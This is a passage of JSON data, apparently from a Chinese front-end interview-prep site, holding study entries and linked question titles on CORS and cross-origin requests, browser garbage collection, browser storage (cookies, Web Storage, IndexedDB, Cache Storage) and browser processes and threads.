    "exerciseKeyList": "[\"4ca8dcc9-9ce6-457c-b6ef-3c2e322aeba5\",\"ce6357ce-cce3-4ccc-90d8-7fe7704f3312\",\"20f1385d-4442-43c5-bb20-2a53a9bfc6c6\",\"3f9c98d1-28f5-46fe-ba4b-ee7d9f6107cf\",\"e41a4651-2c23-43c7-853c-cdf6039325f6\",\"56e56a05-99c7-4701-ae72-e06d2c6a4d42\",\"87408912-b244-4727-951c-65993c6dbcff\",\"b4001078-1e40-481b-8fcd-c4d48e6dd855\",\"03d5dfc7-9bb9-4129-9145-b4da4d4fa11f\",\"38c7340e-cb35-43e0-8ea0-20e75b2780a5\",\"3538f4eb-5b78-4ffc-aeae-ccfdd45976a4\"]",
    "vipLimit": 1,
    "level": 1.5,
    "pointOrder": 1,
    "createAt": "2024-12-17T14:03:56.000Z",
    "updateAt": "2025-07-17T15:24:39.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "03d5dfc7-9bb9-4129-9145-b4da4d4fa11f",
        "title": "说说webpack proxy工作原理？为什么能解决跨域?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:33:37.000Z",
        "updateAt": "2024-01-25T19:07:54.000Z"
      },
      {
        "exerciseKey": "20f1385d-4442-43c5-bb20-2a53a9bfc6c6",
        "title": "JSONP 是如何实现跨域的?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T12:17:52.000Z"
      },
      {
        "exerciseKey": "3538f4eb-5b78-4ffc-aeae-ccfdd45976a4",
        "title": "什么是跨域？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:49:49.000Z",
        "updateAt": "2024-08-10T17:04:48.000Z"
      },
      {
        "exerciseKey": "38c7340e-cb35-43e0-8ea0-20e75b2780a5",
        "title": "Vue项目中如何解决跨域问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:51:10.000Z",
        "updateAt": "2024-08-10T17:04:48.000Z"
      },
      {
        "exerciseKey": "3f9c98d1-28f5-46fe-ba4b-ee7d9f6107cf",
        "title": "在域名 A 的网站上，跨域请求域名 B 上的接口，怎么在跨域请求中携带域名 B 的 Cookie 呢？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:14.000Z",
        "updateAt": "2024-10-30T01:37:42.000Z"
      },
      {
        "exerciseKey": "4ca8dcc9-9ce6-457c-b6ef-3c2e322aeba5",
        "title": "浏览器的同源策略是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T02:42:15.000Z",
        "updateAt": "2024-07-20T11:49:30.000Z"
      },
      {
        "exerciseKey": "56e56a05-99c7-4701-ae72-e06d2c6a4d42",
        "title": "前端怎么实现跨域请求？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-15T15:50:15.000Z",
        "updateAt": "2024-08-10T17:06:17.000Z"
      },
      {
        "exerciseKey": "87408912-b244-4727-951c-65993c6dbcff",
        "title": "怎么解决canvas中获取跨域图片数据的问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-08T15:35:58.000Z",
        "updateAt": "2024-08-10T17:06:15.000Z"
      },
      {
        "exerciseKey": "b4001078-1e40-481b-8fcd-c4d48e6dd855",
        "title": "浏览器为什么要有跨域限制？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T02:49:50.000Z",
        "updateAt": "2024-08-10T17:05:47.000Z"
      },
      {
        "exerciseKey": "ce6357ce-cce3-4ccc-90d8-7fe7704f3312",
        "title": "CORS 是如何实现跨域的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2025-07-16T12:44:36.000Z"
      },
      {
        "exerciseKey": "e41a4651-2c23-43c7-853c-cdf6039325f6",
        "title": "跨域时怎么处理 cookie？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-17T11:34:09.000Z",
        "updateAt": "2024-08-10T17:06:49.000Z"
      }
    ]
  },
  "217": {
    "id": 217,
    "tagId": 21,
    "title": "跨域资源共享（CORS）",
    "explanation": "跨域资源共享（CORS，Cross-Origin Resource Sharing）是浏览器用来放宽同源策略限制的一种机制，是前端跨域请求的主流解决方案。面试时考察点主要围绕它的原理、工作流程、配置细节及相关安全问题。\n\n## 一、CORS 基础概念\n\n* **作用**：允许浏览器从不同源的服务器请求资源，突破同源策略限制。\n* **原理**：服务器通过设置特定的 HTTP 响应头，告诉浏览器允许跨域访问。\n\n## 二、CORS 的关键响应头\n\n| 头部                                 | 说明                                                        |\n| ---------------------------------- | --------------------------------------------------------- |\n| `Access-Control-Allow-Origin`      | 指明允许访问的源，可以是具体域名（如 `https://example.com`）或 `*`（表示允许所有域访问） |\n| `Access-Control-Allow-Methods`     | 允许的请求方法（GET、POST、PUT、DELETE 等）                            |\n| `Access-Control-Allow-Headers`     | 允许请求携带的自定义头部字段                                            |\n| `Access-Control-Allow-Credentials` | 是否允许携带 Cookie 或 HTTP 认证信息，值为 `true` 时允许                   |\n| `Access-Control-Max-Age`           | 预检请求的结果缓存时间，单位秒                                           |\n\n\n## 三、CORS 请求分类\n\n### 1. **简单请求**\n\n满足以下条件，浏览器直接发请求：\n\n* 请求方法是 `GET`、`POST`、`HEAD` 中之一。\n* 请求头只包含简单头（如 `Accept`, `Content-Type` 仅限 `application/x-www-form-urlencoded`、`multipart/form-data` 或 `text/plain`）。\n* 不携带自定义 Cookie、认证信息。\n\n### 2. **预检请求（Preflight）**\n\n* 当请求不满足简单请求条件时，浏览器先发送 `OPTIONS` 请求询问服务器是否允许该跨域请求。\n* 服务器响应通过特定头部告诉浏览器是否放行。\n\n\n## 四、CORS 工作流程\n\n1. 浏览器发送跨域请求。\n2. 如果是简单请求，直接带上请求头发送实际请求，服务器返回响应带有 CORS 相关头，浏览器决定是否允许。\n3. 如果是非简单请求，浏览器先发 `OPTIONS` 预检请求。\n4. 服务器响应预检，决定是否允许后，浏览器再发实际请求。\n5. 浏览器根据响应头决定是否允许前端访问响应内容。\n\n\n## 五、携带 Cookie 的跨域请求\n\n* 默认情况下，跨域请求不发送 Cookie。\n* 前端请求时必须设置：`xhr.withCredentials = true` 或 `fetch` 的 `credentials: 'include'`。\n* 服务器必须设置：`Access-Control-Allow-Credentials: true`。\n* `Access-Control-Allow-Origin` 不能使用 `*`，必须指定具体域名。\n",
    "testPoint": "1. CORS 是什么？为什么需要它？\n2. 同源策略和 CORS 的关系？\n3. 简单请求和预检请求的区别？\n4. 预检请求的触发条件有哪些？\n5. `Access-Control-Allow-Origin` 设置为 `*` 有什么限制？\n6. 如何支持带 Cookie 的跨域请求？\n7. CORS 配置中的常用响应头说明。\n8. 如何解决跨域请求失败问题？\n9. JSONP 和 CORS 的区别？\n10. 服务器如何配置支持 CORS？",
    "exerciseKeyList": "[\"ce6357ce-cce3-4ccc-90d8-7fe7704f3312\",\"db3a56f2-6e91-4ce0-bbff-f62cb11fe74f\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T14:08:32.000Z",
    "updateAt": "2025-07-17T15:25:41.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "ce6357ce-cce3-4ccc-90d8-7fe7704f3312",
        "title": "CORS 是如何实现跨域的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2025-07-16T12:44:36.000Z"
      },
      {
        "exerciseKey": "db3a56f2-6e91-4ce0-bbff-f62cb11fe74f",
        "title": "CORS 请求中，什么情况下会触发预检请求？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:14.000Z",
        "updateAt": "2024-12-17T01:48:35.000Z"
      }
    ]
  },
  "218": {
    "id": 218,
    "tagId": 20,
    "title": "浏览器的垃圾回收机制",
    "explanation": "浏览器的垃圾回收（Garbage Collection, GC）机制是前端性能优化和内存管理的重要基础。\n\n\n## 一、垃圾回收的基本概念\n\n* **目的**：自动回收不再使用的内存，避免内存泄漏，保证浏览器性能稳定。\n* **GC 触发**：当浏览器检测到内存不足或特定条件时，启动垃圾回收过程。\n\n\n## 二、主要垃圾回收算法\n\n### 1. 标记清除（Mark-and-Sweep）\n\n* 浏览器从\\*\\*根对象（Global、执行上下文中的变量）\\*\\*开始，标记所有可达对象。\n* 没被标记的对象被认为不可达，即不再被使用，进行回收。\n* 是现代 JS 引擎普遍采用的算法。\n\n### 2. 引用计数（Reference Counting）\n\n* 每个对象维护引用计数，引用增加时计数+1，引用消失时计数-1。\n* 计数为 0 的对象立即回收。\n* **缺陷：无法处理循环引用**，现代引擎一般不单独使用。\n\n\n## 三、垃圾回收的触发时机\n\n* 内存分配达到一定阈值时自动触发。\n* 主动调用相关接口（如 Chrome DevTools 手动触发）。\n* 页面卸载时进行清理。\n\n\n## 四、内存泄漏常见原因\n\n1. **全局变量未释放**\n   全局变量一直被引用，无法回收。\n\n2. **闭包导致的变量无法释放**\n   闭包作用域内变量被外部引用。\n\n3. **定时器未清除**\n   `setInterval`、`setTimeout` 未正确清除，导致引用保留。\n\n4. **DOM 节点引用未释放**\n   JS 中持有对已删除 DOM 的引用。\n\n5. **事件监听未移除**\n   绑定事件后，未及时解绑，导致内存无法回收。\n\n## 五、性能优化建议\n\n* 避免不必要的全局变量。\n* 使用完定时器及时清除。\n* 解绑不再使用的事件监听。\n* 谨慎使用闭包，避免无用变量持久存在。\n* 小心操作 DOM，及时释放引用。\n",
    "testPoint": "面试中考察点主要包括 GC 的原理、算法、触发时机、内存泄漏原因及避免方法：\n\n1. 浏览器垃圾回收的原理和常见算法？\n2. 标记清除与引用计数的区别与优缺点？\n3. 什么是内存泄漏？常见的内存泄漏类型？\n4. 如何避免内存泄漏？\n5. JS 引擎如何判断对象是否可回收？\n6. 浏览器中 GC 触发的时机？\n7. 如何用 Chrome DevTools 监测内存泄漏？\n8. 事件监听和闭包如何导致内存泄漏？\n",
    "exerciseKeyList": "[\"64279d15-4a32-42a1-809a-6e35d59c6e62\",\"6dd983d9-39fc-48ca-9e22-7599ab339f5b\",\"fc324726-dc8d-4495-9da8-72fc70470b07\",\"b9bd9552-5748-45b1-88a8-f36e45f6261f\",\"cecf2aa7-4281-4255-95c9-e8ae487760f1\",\"7e744ea0-1c66-4ef9-b984-bb8828d98279\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T14:12:24.000Z",
    "updateAt": "2025-07-17T15:27:14.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "64279d15-4a32-42a1-809a-6e35d59c6e62",
        "title": "JS 内存泄露的问题该如何排查？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2025-04-17T01:00:05.000Z"
      },
      {
        "exerciseKey": "6dd983d9-39fc-48ca-9e22-7599ab339f5b",
        "title": "如何检查Javascript中的内存泄漏？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T02:46:37.000Z",
        "updateAt": "2024-01-25T19:19:51.000Z"
      },
      {
        "exerciseKey": "7e744ea0-1c66-4ef9-b984-bb8828d98279",
        "title": "JavaScript 是怎么做内存管理的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-19T01:20:52.000Z"
      },
      {
        "exerciseKey": "b9bd9552-5748-45b1-88a8-f36e45f6261f",
        "title": "什么是内存泄漏？什么原因会导致呢？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:55:39.000Z",
        "updateAt": "2024-08-10T17:05:14.000Z"
      },
      {
        "exerciseKey": "cecf2aa7-4281-4255-95c9-e8ae487760f1",
        "title": "说说 JavaScript 中内存泄漏有哪几种情况？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T14:00:11.000Z",
        "updateAt": "2024-08-10T17:04:35.000Z"
      },
      {
        "exerciseKey": "fc324726-dc8d-4495-9da8-72fc70470b07",
        "title": "什么是内存泄漏？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T02:08:57.000Z",
        "updateAt": "2021-09-25T19:05:36.000Z"
      }
    ]
  },
  "219": {
    "id": 219,
    "tagId": 20,
    "title": "浏览器的存储机制",
    "explanation": "浏览器的存储机制涵盖多种技术，目的是满足 Web 应用在不同场景下的数据持久化、缓存和离线访问需求。它们各自具有不同的存储容量、生命周期、安全策略和访问方式，理解这些机制对于构建高效、安全的前端应用至关重要。\n\n---\n\n### 一、浏览器存储机制分类\n\n#### 1. Cookie\n\n最早期的存储机制，主要用于会话管理和身份认证。\n\n* **容量限制**：单个约 4KB，总数有限制；\n* **生命周期**：可设置过期时间或为会话级；\n* **访问方式**：由浏览器自动在 HTTP 请求头中携带，也能通过 JS 访问（除非设置 HttpOnly）；\n* **安全性**：可设置 HttpOnly、Secure、SameSite 防范安全风险。\n\n#### 2. Web Storage（LocalStorage 和 SessionStorage）\n\nHTML5 新增的简单键值对存储方案。\n\n* **LocalStorage**：永久存储，关闭浏览器数据仍保留，同源可访问；\n* **SessionStorage**：页面会话存储，关闭标签页即清空；\n* **容量**：一般为 5\\~10MB；\n* **访问方式**：同步 API，容易使用但可能阻塞主线程。\n\n#### 3. IndexedDB\n\n浏览器内置的底层结构化数据库，支持事务和索引，适合复杂和大容量数据存储。\n\n* **容量**：远大于 LocalStorage，通常以设备剩余空间为限；\n* **访问方式**：异步 API，支持复杂操作；\n* **用途**：离线应用、大数据缓存、文件存储等。\n\n#### 4. Cache Storage\n\n由 Service Worker 管理的请求和响应缓存，用于离线和加速访问。\n\n* **容量**：较大，依赖设备和浏览器策略；\n* **访问方式**：异步 Promise API；\n* **用途**：缓存静态资源、接口响应，实现离线支持。\n\n#### 5. Service Worker\n\n虽然不是存储机制本身，但作为浏览器后台代理进程，管理 Cache Storage，实现网络请求拦截和缓存策略，是现代离线应用的核心。\n\n* **生命周期独立于页面**，可在后台运行；\n* **控制页面的网络请求**，提供离线能力和资源预缓存；\n* **可结合 Cache Storage 和 IndexedDB 进行数据管理**。\n\n---\n\n### 二、存储机制的生命周期与访问作用域\n\n* **Cookie**：基于域和路径，可设置 HttpOnly、Secure 限制访问；\n* **LocalStorage/SessionStorage**：基于同源策略，SessionStorage 进一步限定于标签页会话；\n* **IndexedDB 和 Cache Storage**：基于同源，支持版本控制和升级；\n* **Service Worker**：独立于页面，能控制同源下的所有相关页面。\n\n---\n\n### 三、容量限制与性能影响\n\n* **Cookie** 容量最小，且会随每次请求自动发送，影响网络性能；\n* **LocalStorage/SessionStorage** 适合轻量存储，容量适中；\n* **IndexedDB 和 Cache Storage** 容量大，适合海量数据和文件缓存；\n* **Service Worker** 通过异步调度，避免阻塞主线程。\n\n---\n\n### 四、安全与隐私考虑\n\n* **Cookie** 可被服务器访问，设置 HttpOnly 避免脚本窃取；\n* **Web Storage、IndexedDB** 只能由同源脚本访问，防止跨站数据泄漏；\n* **Service Worker** 需 HTTPS 环境，避免被恶意注入；\n* 用户隐私模式下，存储行为可能受限，数据不保证持久。\n\n---\n\n### 五、应用场景及选择建议\n\n* 需要与服务器频繁交互、会话维持时用 Cookie；\n* 存储简单配置、少量数据用 LocalStorage；\n* 页面会话临时数据用 SessionStorage；\n* 大规模结构化数据和离线存储用 IndexedDB；\n* 静态资源及请求缓存用 Cache Storage，配合 Service Worker 提升离线体验和性能；\n* Service Worker 负责管理缓存和拦截网络请求，实现 PWA 功能。\n\n",
    "testPoint": "面试考察点通常围绕存储类型、特点、使用场景、容量限制、安全性和生命周期展开：\n\n1. 浏览器有哪些本地存储方式？分别有什么特点？\n2. Cookie 和 LocalStorage 的区别是什么？\n3. 如何安全使用 Cookie？`HttpOnly` 和 `Secure` 有什么作用？\n4. SessionStorage 和 LocalStorage 有哪些区别？\n5. IndexedDB 的优势和适用场景？\n6. 如何使用 Cache Storage 实现离线缓存？\n7. 存储容量限制和浏览器兼容性问题？\n8. 如何避免本地存储的数据被篡改或泄露？\n9. 存储的生命周期和访问范围如何理解？\n10. 同源策略对浏览器存储的影响？\n",
    "exerciseKeyList": "[\"8a109788-5551-44a0-ba39-526632145959\",\"6bea229f-8bae-4472-bedb-1260ec4aea47\",\"94393532-0d43-407f-8168-73bc6fd523a3\",\"e41a4651-2c23-43c7-853c-cdf6039325f6\",\"718abe6b-08ab-4669-bc33-187fabad8fec\",\"596630fb-95e6-43c4-a1cc-48683233ae76\",\"aef19252-da7d-447d-a9c5-3eb0d191901d\",\"d86b13c6-54f1-423a-80c5-e52c24f71e30\",\"d370ad63-b673-4887-899d-6446148bcfe7\",\"a6c99a3d-88a1-4806-8443-89368f608ba1\",\"31809048-eda0-40d6-847a-0d04d28b6432\",\"f18218c8-4c74-4631-b66d-e7ac65929f35\",\"f3a5d518-64e1-454a-80ec-5991c4cedeb0\",\"b84d40fe-e50a-48e1-b6bf-ddaf036b64fd\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-12-17T14:16:17.000Z",
    "updateAt": "2025-07-17T15:30:15.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "31809048-eda0-40d6-847a-0d04d28b6432",
        "title": "请说说cookie与session有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T13:53:28.000Z",
        "updateAt": "2024-08-10T17:05:12.000Z"
      },
      {
        "exerciseKey": "596630fb-95e6-43c4-a1cc-48683233ae76",
        "title": "说说你对cookie的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-02-06T13:32:12.000Z",
        "updateAt": "2024-08-10T17:06:08.000Z"
      },
      {
        "exerciseKey": "6bea229f-8bae-4472-bedb-1260ec4aea47",
        "title": "cookie 怎么设置只在 https 时携带？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-09-06T01:26:15.000Z",
        "updateAt": "2024-08-10T17:06:58.000Z"
      },
      {
        "exerciseKey": "718abe6b-08ab-4669-bc33-187fabad8fec",
        "title": "cookie、localStorage和sessionStorage 三者之间有什么区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-15T16:01:01.000Z",
        "updateAt": "2024-08-10T17:06:17.000Z"
      },
      {
        "exerciseKey": "8a109788-5551-44a0-ba39-526632145959",
        "title": "cookie 构成部分有哪些",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T19:17:33.000Z"
      },
      {
        "exerciseKey": "94393532-0d43-407f-8168-73bc6fd523a3",
        "title": "cookie 的有效时间设置为 0 会怎么样",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-16T05:08:54.000Z",
        "updateAt": "2023-09-10T19:17:28.000Z"
      },
      {
        "exerciseKey": "a6c99a3d-88a1-4806-8443-89368f608ba1",
        "title": "使用cookie、session维持登录状态的原理是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T09:35:18.000Z",
        "updateAt": "2024-08-10T17:05:47.000Z"
      },
      {
        "exerciseKey": "aef19252-da7d-447d-a9c5-3eb0d191901d",
        "title": "什么是 Samesite Cookie 属性？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T14:33:13.000Z",
        "updateAt": "2024-08-10T17:05:59.000Z"
      },
      {
        "exerciseKey": "b84d40fe-e50a-48e1-b6bf-ddaf036b64fd",
        "title": "Service Worker 是如何缓存 http 请求资源的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T09:39:41.000Z"
      },
      {
        "exerciseKey": "d370ad63-b673-4887-899d-6446148bcfe7",
        "title": "cookie中的 HttpOnly 属性有什么用途？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T09:44:32.000Z",
        "updateAt": "2024-08-10T17:05:48.000Z"
      },
      {
        "exerciseKey": "d86b13c6-54f1-423a-80c5-e52c24f71e30",
        "title": "Cookie 的 SameSite 属性有什么作用？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T09:49:45.000Z",
        "updateAt": "2024-08-10T17:05:48.000Z"
      },
      {
        "exerciseKey": "e41a4651-2c23-43c7-853c-cdf6039325f6",
        "title": "跨域时怎么处理 cookie？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-17T11:34:09.000Z",
        "updateAt": "2024-08-10T17:06:49.000Z"
      },
      {
        "exerciseKey": "f18218c8-4c74-4631-b66d-e7ac65929f35",
        "title": "WebWorker、SharedWorker 和 ServiceWorker 有哪些区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T23:23:12.000Z"
      },
      {
        "exerciseKey": "f3a5d518-64e1-454a-80ec-5991c4cedeb0",
        "title": "Service worker是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T07:39:30.000Z",
        "updateAt": "2024-07-22T10:52:38.000Z"
      }
    ]
  },
  "220": {
    "id": 220,
    "tagId": 16,
    "title": "浏览器的进程和线程",
    "explanation": "## 区分进程和线程\n\n线程和进程区分不清，是很多新手都会犯的错误，没有关系。这很正常。先看看下面这个形象的比喻：\n\n```js\n- 进程是一个工厂，工厂有它的独立资源\n\n- 工厂之间相互独立\n\n- 线程是工厂中的工人，多个工人协作完成任务\n\n- 工厂内有一个或多个工人\n\n- 工人之间共享空间\n```\n\n再完善完善概念：\n\n```js\n- 工厂的资源 -> 系统分配的内存（独立的一块内存）\n\n- 工厂之间的相互独立 -> 进程之间相互独立\n\n- 多个工人协作完成任务 -> 多个线程在进程中协作完成任务\n\n- 工厂内有一个或多个工人 -> 一个进程由一个或多个线程组成\n\n- 工人之间共享空间 -> 同一进程下的各个线程之间共享程序的内存空间（包括代码段、数据集、堆等）\n```\n\n然后再巩固下：\n\n如果是windows电脑中，可以打开任务管理器，可以看到有一个后台进程列表。对，那里就是查看进程的地方，而且可以看到每个进程的内存资源信息以及cpu占有率。\n\n![](https://static.ecool.fun//article/6aba113a-ceaa-4155-b3fd-6a80a44d1575.awebp)\n\n所以，应该更容易理解了：**进程是cpu资源分配的最小单位（系统会给它分配内存）**\n\n最后，再用较为官方的术语描述一遍：\n\n-   进程是cpu资源分配的最小单位（是能拥有资源和独立运行的最小单位）\n    \n-   线程是cpu调度的最小单位（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程）\n    \n\n**tips**\n\n-   不同进程之间也可以通信，不过代价较大\n    \n-   现在，一般通用的叫法：**单线程与多线程**，都是指**在一个进程内**的单和多。（所以核心还是得属于一个进程才行）\n    \n\n## 浏览器是多进程的\n\n理解了进程与线程了区别后，接下来对浏览器进行一定程度上的认识：（先看下简化理解）\n\n-   浏览器是多进程的\n    \n-   浏览器之所以能够运行，是因为系统给它的进程分配了资源（cpu、内存）\n    \n-   简单点理解，每打开一个Tab页，就相当于创建了一个独立的浏览器进程。\n    \n\n关于以上几点的验证，**请再第一张图**：\n\n![](https://static.ecool.fun//article/96198b94-3da6-4be7-8954-195f4f4b5ca8.awebp)\n\n图中打开了`Chrome`浏览器的多个标签页，然后可以在`Chrome的任务管理器`中看到有多个进程（分别是每一个Tab页面有一个独立的进程，以及一个主进程）。 感兴趣的可以自行尝试下，如果再多打开一个Tab页，进程正常会+1以上\n\n\\*\\*注意：\\*\\*在这里浏览器应该也有自己的优化机制，有时候打开多个tab页后，可以在Chrome任务管理器中看到，有些进程被合并了 （所以每一个Tab标签对应一个进程并不一定是绝对的）\n\n### 浏览器都包含哪些进程？\n\n知道了浏览器是多进程后，再来看看它到底包含哪些进程：（为了简化理解，仅列举主要进程）\n\n1.  Browser进程：浏览器的主进程（负责协调、主控），只有一个。作用有\n    \n    -   负责浏览器界面显示，与用户交互。如前进，后退等\n        \n    -   负责各个页面的管理，创建和销毁其他进程\n        \n    -   将Renderer进程得到的内存中的Bitmap，绘制到用户界面上\n        \n    -   网络资源的管理，下载等\n        \n2.  第三方插件进程：每种类型的插件对应一个进程，仅当使用该插件时才创建\n    \n3.  GPU进程：最多一个，用于3D绘制等\n    \n4.  浏览器渲染进程（浏览器内核）（Renderer进程，内部是多线程的）：默认每个Tab页面一个进程，互不影响。主要作用为\n    \n    -   页面渲染，脚本执行，事件处理等\n\n强化记忆：**在浏览器中打开一个网页相当于新起了一个进程（进程内有自己的多线程）**\n\n当然，浏览器有时会将多个进程合并（譬如打开多个空白标签页后，会发现多个空白标签页被合并成了一个进程），如图\n\n![](https://static.ecool.fun//article/3ab4c83f-9bf9-4850-a94b-ab64b6d50898.awebp)\n\n另外，可以通过Chrome的`更多工具 -> 任务管理器`自行验证\n\n### 浏览器多进程的优势\n\n相比于单进程浏览器，多进程有如下优点：\n\n-   避免单个page crash影响整个浏览器\n    \n-   避免第三方插件crash影响整个浏览器\n    \n-   多进程充分利用多核优势\n    \n-   方便使用沙盒模型隔离插件等进程，提高浏览器稳定性\n    \n\n简单点理解：**如果浏览器是单进程，那么某个Tab页崩溃了，就影响了整个浏览器，体验有多差；同理如果是单进程，插件崩溃了也会影响整个浏览器；而且多进程还有其它的诸多优势。。。**\n\n当然，内存等资源消耗也会更大，有点空间换时间的意思。\n\n### 重点是浏览器内核（渲染进程）\n\n重点来了，我们可以看到，上面提到了这么多的进程，那么，对于普通的前端操作来说，最终要的是什么呢？答案是**渲染进程**\n\n可以这样理解，页面的渲染，JS的执行，事件的循环，都在这个进程内进行。接下来重点分析这个进程\n\n**请牢记，浏览器的渲染进程是多线程的**（这点如果不理解，**请回头看进程和线程的区分**）\n\n终于到了线程这个概念了😭，好亲切。那么接下来看看它都包含了哪些线程（列举一些主要常驻线程）：\n\n1.  GUI渲染线程\n    \n    -   负责渲染浏览器界面，解析HTML，CSS，构建DOM树和RenderObject树，布局和绘制等。\n        \n    -   当界面需要重绘（Repaint）或由于某种操作引发回流(reflow)时，该线程就会执行\n        \n    -   注意，**GUI渲染线程与JS引擎线程是互斥的**，当JS引擎执行时GUI线程会被挂起（相当于被冻结了），GUI更新会被保存在一个队列中**等到JS引擎空闲时**立即被执行。\n        \n2.  JS引擎线程\n    \n    -   也称为JS内核，负责处理Javascript脚本程序。（例如V8引擎）\n        \n    -   JS引擎线程负责解析Javascript脚本，运行代码。\n        \n    -   JS引擎一直等待着任务队列中任务的到来，然后加以处理，一个Tab页（renderer进程）中无论什么时候都只有一个JS线程在运行JS程序\n        \n    -   同样注意，**GUI渲染线程与JS引擎线程是互斥的**，所以如果JS执行的时间过长，这样就会造成页面的渲染不连贯，导致页面渲染加载阻塞。\n        \n3.  事件触发线程\n    \n    -   归属于浏览器而不是JS引擎，用来控制事件循环（可以理解，JS引擎自己都忙不过来，需要浏览器另开线程协助）\n        \n    -   当JS引擎执行代码块如setTimeOut时（也可来自浏览器内核的其他线程,如鼠标点击、AJAX异步请求等），会将对应任务添加到事件线程中\n        \n    -   当对应的事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待JS引擎的处理\n        \n    -   注意，由于JS的单线程关系，所以这些待处理队列中的事件都得排队等待JS引擎处理（当JS引擎空闲时才会去执行）\n        \n4.  定时触发器线程\n    \n    -   传说中的`setInterval`与`setTimeout`所在线程\n        \n    -   浏览器定时计数器并不是由JavaScript引擎计数的,（因为JavaScript引擎是单线程的, 如果处于阻塞线程状态就会影响记计时的准确）\n        \n    -   因此通过单独线程来计时并触发定时（计时完毕后，添加到事件队列中，等待JS引擎空闲后执行）\n        \n    -   注意，W3C在HTML标准中规定，规定要求setTimeout中低于4ms的时间间隔算为4ms。\n        \n5.  异步http请求线程\n    \n    -   在XMLHttpRequest在连接后是通过浏览器新开一个线程请求\n        \n    -   将检测到状态变更时，如果设置有回调函数，异步线程就**产生状态变更事件**，将这个回调再放入事件队列中。再由JavaScript引擎执行。\n        \n\n看到这里，如果觉得累了，可以先休息下，这些概念需要被消化，毕竟后续将提到的事件循环机制就是基于`事件触发线程`的，所以如果仅仅是看某个碎片化知识， 可能会有一种似懂非懂的感觉。要完成的梳理一遍才能快速沉淀，不易遗忘。放张图巩固下吧：\n\n![](https://static.ecool.fun//article/dfaf527c-84f6-4b60-b48f-d9576f23b7a8.awebp)\n\n再说一点，为什么JS引擎是单线程的？额，这个问题其实应该没有标准答案，譬如，可能仅仅是因为由于多线程的复杂性，譬如多线程操作一般要加锁，因此最初设计时选择了单线程。。。\n\n### Browser进程和浏览器内核（Renderer进程）的通信过程\n\n看到这里，首先，应该对浏览器内的进程和线程都有一定理解了，那么接下来，再谈谈浏览器的Browser进程（控制进程）是如何和内核通信的， 这点也理解后，就可以将这部分的知识串联起来，从头到尾有一个完整的概念。\n\n如果自己打开任务管理器，然后打开一个浏览器，就可以看到：**任务管理器中出现了两个进程（一个是主控进程，一个则是打开Tab页的渲染进程）**， 然后在这前提下，看下整个的过程：(简化了很多)\n\n-   Browser进程收到用户请求，首先需要获取页面内容（譬如通过网络下载资源），随后将该任务通过RendererHost接口传递给Render进程\n    \n-   Renderer进程的Renderer接口收到消息，简单解释后，交给渲染线程，然后开始渲染\n    \n    -   渲染线程接收请求，加载网页并渲染网页，这其中可能需要Browser进程获取资源和需要GPU进程来帮助渲染\n        \n    -   当然可能会有JS线程操作DOM（这样可能会造成回流并重绘）\n        \n    -   最后Render进程将结果传递给Browser进程\n        \n-   Browser进程接收到结果并将结果绘制出来\n    